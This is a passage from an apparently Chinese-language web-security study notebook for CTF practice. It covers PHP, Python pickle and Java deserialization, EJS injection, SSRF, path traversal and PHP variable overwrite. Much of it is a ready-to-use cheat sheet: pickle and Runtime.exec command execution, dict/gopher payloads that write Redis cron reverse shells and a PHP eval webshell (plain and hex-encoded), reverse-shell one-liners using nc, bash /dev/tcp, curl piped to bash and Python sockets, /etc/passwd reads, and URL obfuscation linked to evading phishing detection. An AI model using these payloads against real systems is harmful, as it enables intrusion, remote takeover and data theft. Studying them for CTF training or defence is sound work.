    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //可以设置文件头，设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>

结果
<?php 
    class TestObject {
        public function __destruct() {
            echo 'Destruct called';
        }
    }

    $filename = 'phar://phar.phar/test.txt';//既然是压缩文件，我们可以如此访问其中的某个文件
    file_get_contents($filename); 
?>

发现被反序列划，几对于上面的生成文件稍加修改，其中的metadata会自动进行反序列化
```

## 反序列化 原生类逃逸
当存在原生类创建的时候，可以尝试原生类逃逸

<!-- 这是一张图片，ocr 内容为：C1ASS CATALOGUEL PUBLIC $CLASS; $DATA: PUBLIC FUNCTION PUBLIC CONSTRUCT "ERROR" $THIS->CLASS $THIS->DATA HACKER? FUNCTION __ DESTRUCT ) ECHO NEW $THIS->CLAS LASS($THIS->DATA) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1719891856983-d98bb67a-bcf7-4b10-9ea2-021ae932b694.png)

原生类读取文件：

```plain
# 目录遍历原生类

  1.DirectoryIterator类
    <?php
      $dir=new DirectoryIterator("/");
      echo $dir;

  2.FilesystemIterator类
    <?php
      $dir=new FilesystemIterator("/");
      echo $dir;

  3.GlobIterator类 通过匹配模式查找文件
    <?php
      $dir=new GlobIterator("f*txt");
      echo $dir;

# 读取文件类

  1.SplFileObject类
    <?php
      $dir=new SplFileObject("/flag.txt");
      echo $dir;
      ?>
```

## 反序列化 例题
```php
<?php

  error_reporting(0);
show_source("index.php");

class w44m{

  private $admin = 'aaa';
  protected $passwd = '123456';

  public function Getflag(){
    if($this->admin === 'w44m' && $this->passwd ==='08067'){
      include('flag.php');
      echo $flag;
    }else{
      echo $this->admin;
      echo $this->passwd;
      echo 'nono';
    }
  }
}

class w22m{
  public $w00m;
  public function __destruct(){
    echo $this->w00m;
  }
}

class w33m{
  public $w00m;
  public $w22m;
  public function __toString(){
    $this->w00m->{$this->w22m}();
    return 0;
  }
}

$w00m = $_GET['w00m'];
unserialize($w00m);

?> 
```

WP

```php

/*
wp：
# 传参$w00m,直接反序列化，入口就在__destruct，或者_wakeup，这里的w22m符合条件
class w22m{
public $w00m;
public function __destruct(){
echo $this->w00m;
}
}

# echo一个对象，调用__toString方法，然后调用内部w00m的方法，由此可得链子如下
# w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
*/

<?php

class w44m{

  private $admin = 'w44m';
  protected $passwd = '08067';

}

class w22m{
  public $w00m;
}

class w33m{
  public $w00m;
  public $w22m;

}
# w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
$a = new w22m();
$b = new w33m();
$c = new w44m();
# 入口
$a->w00m=$b; // 
# 链子
$b->w00m=$c;
$b->w22m='Getflag';
echo urlencode(serialize($a));

/*
$a 是一个 w22m 对象，它的 w00m 属性被设置为 $b（一个 w33m 对象）。
$b 是一个 w33m 对象，它的 w00m 属性被设置为 $c（一个 w44m 对象），并且它的 w22m 属性被设置为字符串 'Getflag'。
序列化：
当 $a 对象被序列化时，它包含了对 $b（w33m 对象）的引用，而 $b 又包含了对 $c（w44m 对象）的引用。序列化会捕获这些对象及其属性值，并生成一个可以恢复这些对象的字符串。
*/
```

NSS上一道非常精妙的题目

```php
<?php
  include "waf.php";
class NISA{
  public $fun="show_me_flag";
  public $txw4ever;
  public function __wakeup()
  {
    if($this->fun=="show_me_flag"){
      hint();
    }
  }

  function __call($from,$val){
    $this->fun=$val[0];
  }

  public function __toString()
  {
    echo $this->fun;
    return " ";
  }
  public function __invoke()
  {
    checkcheck($this->txw4ever);
    @eval($this->txw4ever);
  }
}

class TianXiWei{
  public $ext;
  public $x;
  public function __wakeup()
  {
    $this->ext->nisa($this->x);
  }
}

class Ilovetxw{
  public $huang;
  public $su;

  public function __call($fun1,$arg){
    $this->huang->fun=$arg[0];
  }

  public function __toString(){
    $bb = $this->su;
    return $bb();
  }
}

class four{
  public $a="TXW4EVER";
  private $fun='abc';

  public function __set($name, $value)
  {
    $this->$name=$value;
    if ($this->fun = "sixsixsix"){
      strtolower($this->a);
    }
  }
}

if(isset($_GET['ser'])){
  @unserialize($_GET['ser']);
}else{
  highlight_file(__FILE__);
}

//func checkcheck($data){
//  if(preg_match(......)){
//      die(something wrong);
//  }
//}

//function hint(){
//    echo ".......";
//    die();
//}
?>
```

## 反序列化 反序列化字符串的结构与代码
```plain
# 反序列化代码
  <?php
  class wllm{
  	public $admin="admin";
  	public $passwd="ctf";
  }
  $a=new wllm();
  $b=serialize($a);
  echo $b;
  ?>

  序列化后内容 ： O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}

# 分析序列化
  O:8:"Kengwang":7:{s:4:"name";s:8:"kengwang";s:3:"age";i:18;s:3:"sex";b:1;s:5:"route";E:	17:"LearningRoute:Web";s:3:"tag";a:3:{i:0;s:4:"dino";i:1;s:4:"cdut";i:2;s:7:"chengdu";}s:10:"girlFriend";N;s:15:"Kengwangpants";s:3:"red";}
  O:8:"Kengwang":7:{ // 定义了一个对象 [O], 对象名称长度为 [8], 对象类型数为 [7]
      s:4:"name";s:8:"kengwang"; // 第一个字段名称是[4]个长度的"name", 值为长度为[8]的字符串([s]) "kengwang" 
      s:3:"age";i:18; // 第二个字段名称是长度为[3]的"age", 值为整数型([i]): 18
      s:3:"sex";b:1; // 第三个字段名称是长度为[3]的"sex", 值为布尔型([b]): 1 -> true
      s:5:"route";E:17:"LearningRoute:Web"; // 第四个字段名称是长度为[5]的"route", 值为枚举类型([E]), 枚举值长度为 [17], 值为 "...":
      s:3:"tag";a:3:{ // 长度为 [3] 的数组([a])
          i:0;s:4:"dino"; // 第[0]个元素
          i:1;s:4:"cdut";
          i:2;s:7:"chengdu";
      }
      s:10:"girlFriend";N; // 字段 "girlFriend" 为 NULL
      s:15:" Kengwang pants";s:3:"red"; // 私有字段名称为 类型名 字段名, 其中类型名用 NULL 字符包裹
  }
```

## 反序列化 Python PICKLE反序列化
 **reduce**这个魔术方法会自动调用

```python
import pickle
import os

# 构造恶意代码
# 原理： __reduce__ 类似 PHP 的 __wakeup__ ，在反序列化的时候会进行触发
class Malicious:
    def __reduce__(self):
        return (os.system, ('echo Hacked!',))

# 序列化恶意对象
malicious_data = pickle.dumps(Malicious())

# 反序列化时执行恶意代码
pickle.loads(malicious_data)
```

## 反序列化 Python opcode PVM 指令集 （暂未补充）
pickle 库

```plain
MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build & push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build & push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py

# Protocol 2

PROTO          = b'\x80'  # identify pickle protocol
NEWOBJ         = b'\x81'  # build object by applying cls.__new__ to argtuple
EXT1           = b'\x82'  # push object from extension registry; 1-byte index
EXT2           = b'\x83'  # ditto, but 2-byte index
EXT4           = b'\x84'  # ditto, but 4-byte index
TUPLE1         = b'\x85'  # build 1-tuple from stack top
TUPLE2         = b'\x86'  # build 2-tuple from two topmost stack items
TUPLE3         = b'\x87'  # build 3-tuple from three topmost stack items
NEWTRUE        = b'\x88'  # push True
NEWFALSE       = b'\x89'  # push False
LONG1          = b'\x8a'  # push long from < 256 bytes
LONG4          = b'\x8b'  # push really big long

_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]

# Protocol 3 (Python 3.x)

BINBYTES       = b'B'   # push bytes; counted binary string argument
SHORT_BINBYTES = b'C'   #  "     "   ;    "      "       "      " < 256 bytes

# Protocol 4

SHORT_BINUNICODE = b'\x8c'  # push short string; UTF-8 length < 256 bytes
BINUNICODE8      = b'\x8d'  # push very long string
BINBYTES8        = b'\x8e'  # push very long bytes string
EMPTY_SET        = b'\x8f'  # push empty set on the stack
ADDITEMS         = b'\x90'  # modify set by adding topmost stack items
FROZENSET        = b'\x91'  # build frozenset from topmost stack items
NEWOBJ_EX        = b'\x92'  # like NEWOBJ but work with keyword only arguments
STACK_GLOBAL     = b'\x93'  # same as GLOBAL but using names on the stacks
MEMOIZE          = b'\x94'  # store top of the stack in memo
FRAME            = b'\x95'  # indicate the beginning of a new frame

# Protocol 5

BYTEARRAY8       = b'\x96'  # push bytearray
NEXT_BUFFER      = b'\x97'  # push next out-of-band buffer
READONLY_BUFFER  = b'\x98'  # make top of stack readonly
```

简易入门

```python
import os
import pickle
import pickletools


class Evil():
    def __reduce__(self):
        return (os.system, ('whoami',))


print(pickle.dumps(Evil(), protocol=0))
pickletools.dis(pickle.dumps(Evil(), protocol=0))

'''
b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
    0: c    GLOBAL     'nt system'
   11: p    PUT        0
   14: (    MARK
   15: V        UNICODE    'whoami'
   23: p        PUT        1
   26: t        TUPLE      (MARK at 14)
   27: p    PUT        2
   30: R    REDUCE
   31: p    PUT        3
   34: .    STOP
highest protocol among opcodes = 0
'''
```

# NodeJs 漏洞
## Nodejs 大小写绕过
```plain
checkcode = checkcode.toLowerCase()
if(checkcode !== "aGr5AtSp55dRacer")

特殊大小写：
  toUpperCase()是javascript中将小写转换成大写的函数。
  toLowerCase()是javascript中将大写转换成小写的函数
  在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。
  在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。

数组绕过：
  以json传参，content-type改成json
  Content-Type: application/json
  {"checkcode": ["a","G","r","5","A","t","S","p","5","5","d","R","a","c","e","r"]}
```

## Nodejs EJS 注入
```html
<!DOCTYPE html>
<html lang="en">
  <head>
  </head>
  <body>
    <div>
      <%= process.mainModule.require('child_process').execSync('ls') %>
    </div>
  </body>
</html>
```

# JAVA 安全
## JAVA 反序列化
JAVA 反射前置

```java
package com;
import java.io.*;

public class User implements Serializable {

    private static final long serialVersionUID = 1L;
    private String name;
    private int age;

    public User(String name, int age) {

        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {

        return "User{name='" + name + "', age=" + age + "}";
    }

    public static void main(String[] args) {

        String filePath = "user.ser";
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filePath))) {

            User user = (User) ois.readObject();
            System.out.println("反序列化得到的用户: " + user);
        } catch (IOException | ClassNotFoundException e) {

            e.printStackTrace();
        }
    }
}

```



## JAVA 反射机制
参考文章 [https://xz.aliyun.com/news/8621](https://xz.aliyun.com/news/8621) 反射一般通过 java.lang.reflect 类进行实现

获取 类 的属性方法，并且进行实例化

```java
package com;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException {
        Demo demo = new Demo();

        // 可以等效为 Python 的 ''.__class__
        Class c1 = Demo.class; // 直接根据 类获取 class 文件
        System.out.println(c1.getName());

        Class c2 = demo.getClass(); // 使用 getClass 方法获取 class
        System.out.println(c2.getName());

        Class c3 = Class.forName("com.Demo"); // 使用 Class 类方法
        System.out.println(c3.getName());
    }
}

class Demo {
    public Demo() {
        System.out.println("demo start");
    }
}
```

上面中 forName 实战价值最大，但是需要拿到 包名 + 类名

获取成员变量方法：

```java
package com;

import java.lang.reflect.Field;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException {
        // 加载类
        Class c1 = Class.forName("com.Demo");

        // 获取字段
        Field[] fieldArray1 = c1.getFields(); // 获取所有 public 字段
        Field[] fieldArray2 = c1.getDeclaredFields(); // 获取所有声明的字段（包括 private）

        // 获取名为 "name" 的字段（需要处理异常）
        Field fieldArray3 = c1.getDeclaredField("name"); // 使用 getDeclaredField 获取 private 字段

        // 打印字段名
        System.out.println(fieldArray3.getName());

        // 打印 getFields() 获取的字段
        for (Field field : fieldArray1) {
            System.out.println(field.getName());
        }

        // 打印 getDeclaredFields() 获取的字段
        for (Field field : fieldArray2) {
            System.out.println(field.getName());
        }
    }
}

class Demo {
    private String name;

    public Demo(String name) {
        this.name = name;
    }

    public void Say() {
        System.out.println("demo say " + this.name);
    }
}
```

获取成员方法 Method

```plain
Method getMethod(String name, 类<?>... parameterTypes) //返回该类所声明的public方法
Method getDeclaredMethod(String name, 类<?>... parameterTypes) //返回该类所声明的所有方法
```

```java
package com;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) {
        try {
            Class c1 = Class.forName("com.Demo");

            // 获取类中声明的所有方法（包括 private 方法）
            Method[] method1 = c1.getDeclaredMethods();
            for (Method m : method1) {
                System.out.println(m);
            }
            System.out.println("----------");

            // 获取类及其父类中声明为 public 的方法
            Method[] method2 = c1.getMethods();
            for (Method m : method2) {
                System.out.println(m);
            }
            System.out.println("----------");

            // 获取无参的 Say 方法
            Method method3 = c1.getMethod("Say");
            System.out.println(method3);
            System.out.println("----------");

            Method method4 = c1.getDeclaredMethod("Say");
            System.out.println(method4);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

class Demo {
    private String name;

    public Demo(String name) {
        this.name = name;
    }

    public void Say() {
        System.out.println("demo say " + this.name);
    }
}
```

获取构造函数

```plain
Constructor<?>[] getConstructors() ：只返回public构造函数
Constructor<?>[] getDeclaredConstructors() ：返回所有构造函数
Constructor<> getConstructor(类<?>... parameterTypes) : 匹配和参数配型相符的public构造函数
Constructor<> getDeclaredConstructor(类<?>... parameterTypes) ： 匹配和参数配型相符的构造函数
```

```java
package com;

import java.lang.reflect.Constructor;

public class Main {
    public static void main(String[] args){
        try {
            Class c1 = Class.forName("com.Demo");
            Constructor[] constructors1 = c1.getDeclaredConstructors();
            Constructor[] constructors2 = c1.getConstructors();
            for (Constructor c : constructors1) {
                System.out.println(c);
            }
            System.out.println("-------分割线---------");
            for (Constructor c : constructors2) {
                System.out.println(c);
            }
            System.out.println("-------分割线---------");
            Constructor constructors3 = c1.getConstructor(String.class);
            System.out.println(constructors3);
            System.out.println("-------分割线---------");
            Constructor constructors4 = c1.getDeclaredConstructor(String.class);
            System.out.println(constructors4);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

class Demo {
    private String name;

    public Demo(String name) {
        this.name = name;
    }

    public void Say() {
        System.out.println("demo say " + this.name);
    }
}
```

已经可以通过 Class 获取对象、变量、成员方法、成员函数，那么可以通过反射来实例化对象，使用 Class 对象的 newintance 创建类对象

```java
Class c = Class.forName("com.reflect.MethodTest"); // 创建Class对象
Object m1 =  c.newInstance(); // 创建类对象
```

invoke 用法

```plain
public Object invoke(Object obj, Object... args)
第一个参数为类的实例，第二个参数为相应函数中的参数

obj：从中调用底层方法的对象，必须是实例化对象
args： 用于方法的调用，是一个object的数组，参数有可能是多个
```

那么整合构造如下

```java
package com;

import java.lang.reflect.Method;
public class Main {
    public void reflectMethod() {
        System.out.println("反射测试成功!!!");
    }
    
    public static void main(String[] args) {
        try {
            Class c = Class.forName("com.Main"); // 创建Class对象
            Object m = c.newInstance(); // 创建类实例对象
            Method method = c.getMethod("reflectMethod"); // 获取reflectMethod方法
            method.invoke(m); // 调用类实例对象方法
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

对该反射行为的理解

```plain
// 进行类加载，加载 com.Main 并返回对应 Class 类型
  Class c = Class.forName("com.Main");

// 创建类实例对象，等效创建了 com.Main() 实例？
  Object m = c.newInstance(); 

// 获取了 reflectMethod 公共方法
  Method method = c.getMethod("reflectMethod");

// 反射调用 m 对象的 reflectMethod 方法，invoke 方法的第一个参数是方法的调用者对象（即 this），后面的参数是传递给方法的参数。由于 reflectMethod 方法没有参数，所以这里只传入了 m。
  method.invoke(m);
```

动手测试：反射一个 命令执行

```java
package com;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) {
        try {
            Class c = Class.forName("java.lang.Runtime");
            Object o = c.newInstance();
            Method m = c.getDeclaredMethod("exec", String.class);
            m.invoke(o, "calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

执行后发现会报错，其属性为 private

```plain
class com.Main cannot access a member of class java.lang.Runtime (in module java.base) with modifiers "private"
```

绕过方法为实例对象 Runtime.getRuntime().exec("calc"); 的 getRuntime()

```java
package com;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) {
        try {
            Class c = Class.forName("java.lang.Runtime");
            Method method = c.getDeclaredMethod("exec", String.class);
            Method runtimeMethod = c.getMethod("getRuntime");

            Object o = runtimeMethod.invoke(c); // 将 getRuntime 传递给 Runtime
            method.invoke(o,"calc"); // 将 exec 传递给 getRuntime

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

setAccessible 暴力绕过原理看代码

```java
package com;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) {
        try {
            Class c = Class.forName("java.lang.Runtime");
            Constructor ctor = c.getDeclaredConstructor(); // 通过获取到构造函数，然后设置构造函数后，进行修改 setAccessible，再用 newInstance 进行实例化
            ctor.setAccessible(true); // 设置 setAccessible 设置为可访问
            Object o = ctor.newInstance();
            Method m = c.getDeclaredMethod("exec",String.class);
            m.invoke(o,"calc");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

# SSRF
SSRF原理：未对链接过滤可以通过服务器访问内网或者作为代理

```plain
# 漏洞产生相关函数：
  file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()
 
# file_get_contents()
  <?php
    $url = $_GET['url'];;
    echo file_get_contents($url);
  ?>
  file_get_content函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。

# fsockopen()
  <?php 
  function GetFile($host,$port,$link) { 
      $fp = fsockopen($host, intval($port), $errno, $errstr, 30);   
      if (!$fp) { 
          echo "$errstr (error number $errno) \n"; 
      } else { 
          $out = "GET $link HTTP/1.1\r\n"; 
          $out .= "Host: $host\r\n"; 
          $out .= "Connection: Close\r\n\r\n"; 
          $out .= "\r\n"; 
          fwrite($fp, $out); 
          $contents=''; 
          while (!feof($fp)) { 
              $contents.= fgets($fp, 1024); 
          } 
          fclose($fp); 
          return $contents; 
      } 
  }
  ?>
  fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限

# curl_exec()
  <?php 
  if (isset($_POST['url'])){
      $link = $_POST['url'];
      $curlobj = curl_init();// 创建新的 cURL 资源
      curl_setopt($curlobj, CURLOPT_POST, 0);
      curl_setopt($curlobj,CURLOPT_URL,$link);
      curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项
      $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器
      curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源

      $filename = './curled/'.rand().'.txt';
      file_put_contents($filename, $result); 
      echo $result;
  }
  ?>

  curl_exec函数用于执行指定的cURL会话

注意：

1.一般情况下PHP不会开启fopen的gopher wrapper
2.file_get_contents的gopher协议不能URL编码
3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败
4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用
5.curl_exec() //默认不跟踪跳转，
6.file_get_contents() // file_get_contents支持php://input协议
```

## SSRF 利用协议
```plain
审计思路：
  1.可以访问外部资源
  2.还有本地 IP 的url
```

```plain
# file://绝对路径  # 任意读文件
  file:///etc/passwd
  file:///var/www/html/index.php
  file:///usr/local/apache-tomcat/conf/server.xml

# dict://  # 获取redis配置信息 以及执行命令
  ditc://ip:port
  ditc://ip:port/命令

  1.dict协议探测端口和服务指纹
    dict://127.0.0.1:22
    dict://172.22.10.10:3306
    dict://127.0.0.1:6379/info

  2.dict协议攻击redis，写入定时任务，进行反弹shell
    centos系统定时任务的路径为：/var/spool/cron
    debian系统定时任务的路径为：/var/spool/cron/crontabs
    
    redis config get dir #检查当前保存路径
    config get dbfilename #检查保存文件名
    config set dir /root/.ssh/ #设置保存路径
    config set dbfilename authorized_keys #设置保存文件名
    set xz “\n\n\n 公钥 \n\n\n” #将公钥写入xz健
    save #进行保存
    
    config:set redis命令创建文件写入
    dict://127.0.0.1:6379/config:set:dbfilename:root
    dict://127.0.0.1:6379/config:set:dir:/var/spool/cron
    dict://127.0.0.1:6379/set:test:"\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/10.10.10.10/1234 0>&1\n\n"
    dict://127.0.0.1:6379/save
  
    注意：若payload存在被转义或过滤的情况，可利用16进制写入内容
    dict://127.0.0.1:6379/set:test:"\n\n\x2a/1\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/10.10.10.10/1234\x200\x3e\x261\n\n"

  3.dict协议攻击redis，写入webshell
    dict://127.0.0.1:6379/config:set:dbfilename:test.php
    dict://127.0.0.1:6379/config:set:dir:/var/www/html
    dict://127.0.0.1:6379/set:test:"\n\n<?php @eval($_POST[x]);?>\n\n"
    dict://127.0.0.1:6379/save
    
    若存在过滤， 则利用16进制内容写入：
    dict://127.0.0.1:6379/set:test:"\n\n\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e\n\n"

  4.dict协议攻击redis，写入ssh公钥
    操作和写入定时任务相似

# gopher//  # 万能协议 一键反弹bash
  结构：
    *<参数数量> CR LF
    $<参数 1 的字节数量> CR LF
     <参数 1 的数据> CR LF
    ...
     $<参数 N 的字节数量> CR LF
     <参数 N 的数据> CR LF

  payload ：
    *4
    $6
     config
     $3
    set
     $3
    dir
    $13
    /var/www/html

    Gopherus自动化生成shell：https://github.com/tarunkant/Gopherus
```

## SSRF gopher 附加部分
```plain
gopher://IP:port/_{TCP/IP数据流}，只需要替换发送的数据换行符为 \r\n 拼接在后面并编码即可
发送的时候需要再次编码

例如 :
  POST /ops/sync HTTP/1.1
  Host: 127.0.0.1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0
  Content-Length: 10
  
  data=123

Payload:
  import urllib.parse

  payload = """
  POST /ops/sync HTTP/1.1
  Host: 127.0.0.1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0
  Content-Length: 10
  
  data=123
  """
  print("[+] 构造的POST请求:")
  print(payload)
  print()
  
  payload = payload.replace("\n", "\r\n")
  gopher_payload = f"gopher://127.0.0.1:80/_{urllib.parse.quote(payload)}"
  
  print("[+] Gopher URL:")
  print(gopher_payload)
  print()
  
  final_url = f"?url={urllib.parse.quote(gopher_payload)}"
  print("[+] 最终请求URL:")
  print(final_url)
  print()
```

## SSRF 外带（全盲和半盲SSRF）
```plain
实质上 PHP 外带的原理仅仅知识通过能发送数据的页面，将数据发送到本地服务而已
全盲SSRF需要找到一些点能让数据发送到本地服务器
半盲则为爆破，判断SSRF请求的连接的时间是否不一样
```

## SSRF 绕过
```plain
# 网页跳转绕过
  http://www.baidu.com@10.10.10.10与http://10.10.10.10请求是相同的。

# 点分割符号替换（钓鱼邮件常用于绕过检测）
  在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用。、｡、．来代替：
  http://www。qq。com
  http://www｡qq｡com
  http://www．qq．com

# 本地回环地址的其他表现形式
  127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])：
  http://127.0.0.1 
  http://localhost 
  http://127.255.255.254 
  127.0.0.1 - 127.255.255.254 
  http://[::1] 
  http://[::ffff:7f00:1] 
  http://[::ffff:127.0.0.1] 
  http://127.1 
  http://127.0.1 
  http://0:80
  http://0.0.0.0

# IP的进制转换（钓鱼邮件常用于绕过检测）
  IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。使用如win系统自带的计算机（程序员模式）就可简单实现IP地址的进制转换。
  由于一些系统会直接提取邮件中内嵌的链接进行检测，而一种此类URL混淆技术采用了URL主机名部分中使用的编码十六进制IP地址格式来逃避检测。
  由于IP地址可以用多种格式表示，因此可以在URL中如下所示使用：
  点分十进制IP地址：http://216.58.199.78
  八进制IP地址：http://0330.0072.0307.0116（将每个十进制数字转换为八进制）
  十六进制IP地址：http://0xD83AC74E或者http://0xD8.0x3A.0xC7.0x4E（将每个十进制数字转换为十六进制）
  整数或DWORD IP地址：http://3627730766（将十六进制IP转换为整数）

# 利用短网址
  网上有很多将网址转换为短网址（短链接）的工具网站，黑客会利用短网址来绕过情报检测。
```

## SSRF 修复建议
```plain
1.严格过滤
2.白名单 （黑名单容易过滤）
3.对资源限制，即使访问了也无法未授权访问
4.监控
```

# 反弹shell
## 反弹shell nc
```plain
攻击机开启监听：nc -lvvp port
靶机连接攻击机：nc ip port -e /bin/bash
```

## 反弹shell bash
```plain
靶机执行：
  bash -i >& /dev/tcp/ip/port 0>&1
  bash -i > /dev /tcp /ip/port 0>&1 2>&1

  解析：
    bash -i 打开bash交互
    >& 错误标准重定向输出
    /dev/tcp/x.x.x.x/port 建立socket连接
    0>&1 标准重定向输出

攻击机开启监听：
  nc -lvvp port
```

## 反弹shell curl的web服务器bash
```plain
攻击者服务器执行：
  bash -i >& /dev/tcp/攻击者主机ip/port 0>&1
  
靶机执行：
  curl 攻击者web服务ip|bash
```

## 反弹shell talnet
```plain
靶机开启两个监听 （一个用于发送命令，一个接收）
  nc -lvvp 3333
  nc -lvvp 4444

靶机执行 
  telnet x.x.x.x 3333 | /bin/bash | telnet x.x.x.x 4444
```

## 反弹shell python
```plain
靶机开启监听：
  nc -lvvp 2333
  
服务器执行命令：
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.50.1",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

具体代码
  import socket,subprocess,os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("192.168.50.1",2333))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  p=subprocess.call(["/bin/bash","-i"])
```

# 路径穿越
```plain
路径穿越原理
  ../../../../../ 返回上级目录

特点：
  当存在 /cgi-bin 之类的目录时或者文件时，可以尝试路径穿越
  CVE-2021-41773
    /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
    /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
  
利用：
  1.双写 ../ 如果 ../被单次过滤，尝试 ....//....// 双写过滤
  2.URL编码 . => %2e | / => %2f | % => %25
  3.如果限制过滤文件，尝试 %00 截断绕过
  4.双重编码绕过，因为一层编码后，URL编码任然能被 PHP 解析
  5. 使用 ./ 进行绕过，./ 代表当前目录
```

# PHP 变量覆盖
```plain
# extract(array,extract_rules,prefix) 该函数通过使用数组名作为变量名，使用数组键值作为变量值，对于每个元素创建对应变量，即使用该函数创建对应变量进行覆盖PHP代码中的变量
  <?php
    extract($_GET);  
    echo $name.'<br>';
    echo $age.'<br>';
    echo $phone.'<br>';
    
    //GET传参:?name=xiaohua&age=22&phone=112323123
    //结果:
    // xiaohua
    // 22
    // 112323123
  ?>

# parse_str(string,array) 该函数可以通过查询字符串解析到变量中，如果array未设置，则会覆盖已知变量
  <?php
    parse_str("name=xiaohua&age=22");
